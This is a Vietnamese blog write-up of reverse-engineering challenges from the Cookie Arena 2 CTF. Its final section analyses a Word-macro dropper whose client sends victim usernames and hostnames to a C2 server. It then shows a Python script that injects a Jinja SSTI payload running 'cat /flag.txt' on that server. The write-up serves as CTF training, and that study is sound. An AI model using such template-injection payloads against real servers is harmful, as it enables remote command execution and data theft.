<!doctype html>
<html
  lang="en-us" 
  
    data-theme-mode="true"
  
>
  <head>
    
    <meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/>







  

<title>
  Cookie Arena 2 | Reverse Engineering | Spid3r
</title>
<meta
  name="description"
  content="Clear Reverse Engineering giải Cookie Arena mùa 2"
/>



  <script>
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "true");
</script>


  
<script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
<script data-pjax>
  window.dataLayer = window.dataLayer || [];

  function gtag() {
    dataLayer.push(arguments);
  }

  gtag('js', new Date());

  gtag('config', 'true');
</script>








<script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"error (ﾟ⊿ﾟ)ﾂ\",\"success\":\"copied(*^▽^*)\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":\"本文最后更新于 {time}，请注意文中内容可能已经发生变化。\"}}");
</script>

<script>
  window.siteConfig.swPath = '\/sw.js';
</script>











  
  
  
    
  

  
  
  
    
  

  
  
  
    
  

  
  
  


<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>






  <link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  />





  <meta property="og:type" content="website" />
  <meta property="og:title" content="Cookie Arena 2 | Reverse Engineering | Spid3r" />
  <meta
    property="og:description"
    content="Clear Reverse Engineering giải Cookie Arena mùa 2"
  />
  <meta property="og:url" content="https://sondt1337.github.io/post/cookie-arena-2/" />
  <meta
    property="og:site_name"
    content="Adventures of Spid3r"
  />
  <meta
    property="og:image"
    content="/images/cookie_arena_2/featured.png"
  />
  <meta property="article:author" content="Spid3r" />
  <meta property="article:published_time" content="2023-07-09T11:00:00-07:00" />
  <meta property="article:modified_time" content="2023-07-09T11:00:00-07:00" />
  
    <meta property="article:tag" content="Reverse EngineeringWriteups" />
  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/cookie_arena_2/featured.png" />
  
  
  
  
  




<link rel="shortcut icon" href="/favicon.ico">








  
 <link rel="stylesheet" href="/css/main.min.a6d178773947d1c76596c54c2443acf75cd46e3b9a6f1c7c7f04a9498cb763bf.css" />





  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />






  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />








  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
  ></script>





  


  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />








  <link rel="stylesheet" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" />



    
  </head>
  <body>
    
    

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


  <div class="notification-wrapper">
    <h1>New version found</h1>
    <p>The website seems to have new content, do you want to update?</p>
    <div class="notification-btn">
      <button id="notification-update-btn">Update</button>
      <button id="notification-close-btn">Cancel</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        
<div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe632;
          
        </div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe604;
          
        </div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe628;
          
        </div>
        <a class="main-nav-link" href="/about">About</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe621;
          
        </div>
        <a class="main-nav-link" href="/achievements">Achievements</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
    
  </nav>
</div>
<header id="header">
  
    <picture></picture>
    <img fetchpriority="high" src="/images/cookie_arena_2/featured.png" alt="Cookie Arena 2 | Reverse Engineering">
  

  <div id="header-outer">
    <div id="header-title">
      
        
        
          
        
  
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Cookie Arena 2 | Reverse Engineering</h1>
          </a>
        
      
  
      
        
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>
        <div id="content"
          
          class="sidebar-right"  >
          <aside id="sidebar">
  
  
    <div id="aplayer" theme="var(--color-link)" data-aos="fade-up"></div>
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    >
      
        
          <div class="sidebar-toc-sidebar">
            <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#pyreverse">Pyreverse</a></li>
    <li><a href="#jump">Jump</a>
      <ul>
        <li><a href="#phân-tích-file">Phân tích file</a></li>
        <li><a href="#tìm-địa-chỉ-_flag-và-lấy-flag">Tìm địa chỉ <code>_flag</code> và lấy flag</a></li>
      </ul>
    </li>
    <li><a href="#rev1">Rev1</a>
      <ul>
        <li><a href="#phân-tích-file-1">Phân tích file</a></li>
        <li><a href="#winmain">WinMain</a></li>
        <li><a href="#debug">Debug</a></li>
      </ul>
    </li>
    <li><a href="#cv-malware">CV Malware</a>
      <ul>
        <li><a href="#phân-tích-file-2">Phân tích file</a></li>
        <li><a href="#unzip--check">Unzip &amp; check</a></li>
        <li><a href="#decode">Decode</a></li>
        <li><a href="#clientexe">client.exe</a></li>
        <li><a href="#bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark">Bắt tương tác giữa client với host thông qua Wireshark</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
          </div>
          <div class="sidebar-common-sidebar hidden">
            
<div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.jpg"
    data-sizes="auto"
    alt="Spid3r"
    class="lazyload"
  />
  <div class="sidebar-author-name">Spid3r</div>
  <div class="sidebar-description">I&#39;m a little spider</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      1
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">4</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe604;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe628;
        
      </div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/achievements"
        aria-label="Achievements"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe621;
        
      </div>
      <div class="sidebar-menu-link">Achievements</div>
    </div>
  
</div>

          </div>
        
      

      
        
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
        
      
    </div>
  </div>

  <div class="sidebar-widget">
    
  </div>
  
</aside>

          <section id="main">
  <article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta">
      <div class="article-date">
  <span
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2023-07-09 11:00:00 -0700 -0700" itemprop="datePublished"
      >2023-07-09</time
    >
    <time style="display: none;" id="post-update-time"
      >2023-07-09</time
    >
  </span>
</div>

      <div class="article-category">
  
    <a
      class="article-category-link"
      href="/categories/ctf"
      data-aos="zoom-in"
      >CTF</a
    >
  
</div>

    </div>
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <p><img src="/images/cookie_arena_2/featured.png" alt=""></p>
<h2 id="pyreverse">
<a class="header-anchor" href="#pyreverse"></a>
Pyreverse
</h2><blockquote>
<p>Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.</p></blockquote>
<p>Sử dụng <a href="https://github.com/serfend/pydumpck">pydumpck</a> để decompile <code>exe</code> &ndash;&gt; <code>py</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># pyreverser.pyc.cdc.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">scrambled</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">scrambled</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">scrambled</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">scrambled</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_flag</span> <span class="o">=</span> <span class="n">scramble_flag</span><span class="p">(</span><span class="n">reverse_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Welcome to PyReverser!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Please enter a word or phrase:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_input</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">generated_value</span> <span class="o">=</span> <span class="n">scramble_flag</span><span class="p">(</span><span class="n">reverse_string</span><span class="p">(</span><span class="n">user_input</span><span class="o">.</span><span class="n">upper</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Generated value:&#39;</span><span class="p">,</span> <span class="n">generated_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Can you find the hidden flag?&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">reversed_flag</span> <span class="o">=</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">secret_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Reversed flag:&#39;</span><span class="p">,</span> <span class="n">reversed_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>Để ý flag được decode từ đoạn base64 bên trên</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@Spid3r:~# <span class="nb">echo</span> <span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span> <span class="p">|</span> base64 -d   
</span></span><span class="line"><span class="cl">CHH<span class="o">{</span>python2Exi_Reverse_ENginering<span class="o">}</span>
</span></span></code></pre></div><h2 id="jump">
<a class="header-anchor" href="#jump"></a>
Jump
</h2><blockquote>
<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​</p></blockquote>
<h3 id="phân-tích-file">
<a class="header-anchor" href="#ph%c3%a2n-t%c3%adch-file"></a>
Phân tích file
</h3><p>Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)</p>
<p><img src="/images/cookie_arena_2/image.png" alt=""></p>
<p>Lợi dụng chạy hàm <code>_flag</code> bằng cách nhập ​địa chỉ <code>_flag</code> vào ô nhập khi chạy jump.exe</p>
<h3 id="tìm-địa-chỉ-_flag-và-lấy-flag">
<a class="header-anchor" href="#t%c3%acm-%c4%91%e1%bb%8ba-ch%e1%bb%89-_flag-v%c3%a0-l%e1%ba%a5y-flag"></a>
Tìm địa chỉ <code>_flag</code> và lấy flag
</h3><ul>
<li>Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump)</li>
</ul>
<p><img src="/images/cookie_arena_2/image-3.png" alt=""></p>
<ul>
<li>Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag)</li>
</ul>
<p><img src="/images/cookie_arena_2/image-2.png" alt=""></p>
<p>Lưu ý: địa chỉ <code>00401500</code> đang ở hexa &ndash;&gt; đổi sang decimal là <code>4199680​</code></p>
<p><img src="/images/cookie_arena_2/image-1.png" alt=""></p>
<h2 id="rev1">
<a class="header-anchor" href="#rev1"></a>
Rev1
</h2><blockquote>
<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p></blockquote>
<p><img src="/images/cookie_arena_2/image12.png" alt=""></p>
<h3 id="phân-tích-file-1">
<a class="header-anchor" href="#ph%c3%a2n-t%c3%adch-file-1"></a>
Phân tích file
</h3><p><img src="/images/cookie_arena_2/image-5.png" alt=""></p>
<p><code>PE32</code> &ndash;&gt; 32 bits</p>
<p><code>GUI</code> &ndash;&gt; WinMain</p>
<h3 id="winmain">
<a class="header-anchor" href="#winmain"></a>
WinMain
</h3><ul>
<li>Xử lý I/O</li>
</ul>
<p><img src="/images/cookie_arena_2/image-6.png" alt=""></p>
<p>Kiểm tra trong <code>DialogBoxParamA</code></p>
<p><img src="image-7.png" alt="DialogBoxParamA"></p>
<p>Hàm <code>GetItemTextA</code> sẽ lấy các string được input vào và check key qua <code>sub_402030</code></p>
<p><img src="image-8.png" alt="sub_402030"></p>
<p>Kiểm tra hàm này thì thấy rằng <code>dword_414448</code> chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)</p>
<h3 id="debug">
<a class="header-anchor" href="#debug"></a>
Debug
</h3><p>./video-poster.png</p>
<p>Dựa vào những gì debug được có thể viết lại đoạn code dưới đây:</p>
<p><img src="/images/cookie_arena_2/image19.png" alt=""></p>
<p>Đến đây thì chỉ đơn giản là dùng z3 để viết script giải <a href="solve_rev1.py">solve_rev1.py</a> để lấy key</p>
<p><img src="image20.png" alt="flag"></p>
<h2 id="cv-malware">
<a class="header-anchor" href="#cv-malware"></a>
CV Malware
</h2><blockquote>
<p>Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C&amp;C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!</p></blockquote>
<p>Mang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))</p>
<p><img src="image22.png" alt="File Word của challenge"></p>
<h3 id="phân-tích-file-2">
<a class="header-anchor" href="#ph%c3%a2n-t%c3%adch-file-2"></a>
Phân tích file
</h3><p><img src="/images/cookie_arena_2/image23-1.png" alt=""></p>
<p>Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)</p>
<p><img src="/images/cookie_arena_2/image-9.png" alt=""></p>
<h3 id="unzip--check">
<a class="header-anchor" href="#unzip--check"></a>
Unzip &amp; check
</h3><p>Từ đây mình tiến hành giải nén &ldquo;file zip&rdquo; này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)</p>
<p><img src="/images/cookie_arena_2/image-10.png" alt=""></p>
<p><img src="/images/cookie_arena_2/image-12.png" alt=""></p>
<p>Qua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó</p>
<h3 id="decode">
<a class="header-anchor" href="#decode"></a>
Decode
</h3><p><img src="image-13.png" alt="Decode hexa"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">server:
</span></span><span class="line"><span class="cl">   host: http://REPLACE_HOST_HERE
</span></span><span class="line"><span class="cl">   secret: SecR3TtOKen
</span></span></code></pre></div><p>Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải</p>
<p><img src="image-14.png" alt="Decode Base64"></p>
<p>Dựa vào header <code>MZ</code> của đoạn base64 được decode kia thì có thể đoán được đây là 1 file <code>exe</code> trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào</p>
<ul>
<li>main</li>
</ul>
<p><img src="image-4.png" alt="Hàm main"></p>
<p>Nhìn kỹ 1 chút thì ở đây có hàm <code>downloadFile</code> với tham số là <code>REPLACE_HOST_HERE</code>, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ <code>/static</code> về</p>
<p><img src="/images/cookie_arena_2/image-15.png" alt=""></p>
<p>Với host mặc định của challenge thì chắc chắn sẽ lấy file từ <code>http://103.97.125.53:31040/static/client.exe​</code> truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server.</p>
<h3 id="clientexe">
<a class="header-anchor" href="#clientexe"></a>
client.exe
</h3><p>Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều</p>
<p>Load file vào IDA</p>
<p><img src="/images/cookie_arena_2/image-16.png" alt=""></p>
<p>Dựa vào cách đặt tên thì có thể đoán được:</p>
<ul>
<li><code>main_getSystemInfo()</code> là hàm lấy các thông tin của máy nạn nhân</li>
<li><code>main_sendPostRequest()</code> là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host)</li>
<li>Còn về hàm <code>main_loadAllConfigs()</code> thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về <code>host</code> và <code>secret</code> ban nãy</li>
</ul>
<ul>
<li>main_loadAllConfigs():</li>
</ul>
<p><img src="/images/cookie_arena_2/image-17.png" alt=""></p>
<p>Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini &ndash;&gt; đổi thành <code>config.ini</code> và chuyển <code>host: http://103.97.125.53:31040</code></p>
<h3 id="bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark">
<a class="header-anchor" href="#b%e1%ba%aft-t%c6%b0%c6%a1ng-t%c3%a1c-gi%e1%bb%afa-client-v%e1%bb%9bi-host-th%c3%b4ng-qua-wireshark"></a>
Bắt tương tác giữa client với host thông qua Wireshark
</h3><p><img src="/images/cookie_arena_2/image-18.png" alt=""></p>
<p><img src="/images/cookie_arena_2/image-19.png" alt=""></p>
<p>Từ đây có thể thấy client gửi các thông tin về <code>username</code>, <code>hostname</code> từ phía client đồng thời cùng với <code>secret: SecR3TtOken</code> lên server và được trả về <code>Logged username hostname</code></p>
<p>Từ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://103.97.125.53:31040&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Go-http-server/1.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Secret&#34;</span><span class="p">:</span> <span class="s2">&#34;SecR3Ttoken&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;SPID3R-MSI\Spid3r&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;Spider-msi&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Logged SPID3R-MSI\Spid3r Spid3r-msi</span>
</span></span></code></pre></div><p>Vậy thì đã giải quyết xong việc kết nối &ldquo;nhân tạo&rdquo; giữa client và server thông qua đoạn script trên</p>
<blockquote>
<p>dựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả <code>FLAG nằm trên host, tìm cách kết nối đúng và exploit</code></p></blockquote>
<p>thì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag</p>
<p><img src="/images/cookie_arena_2/image-20.png" alt=""></p>
<p>May thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi</p>
<p>Script giải:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://103.97.125.53:31040&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Go-http-server/1.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Secret&#34;</span><span class="p">:</span> <span class="s2">&#34;SecR3Ttoken&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;{{url_for.__globals__.os.__dict__.popen(&#39;cat /flag.txt).read()}}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;Spider-msi&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi</span>
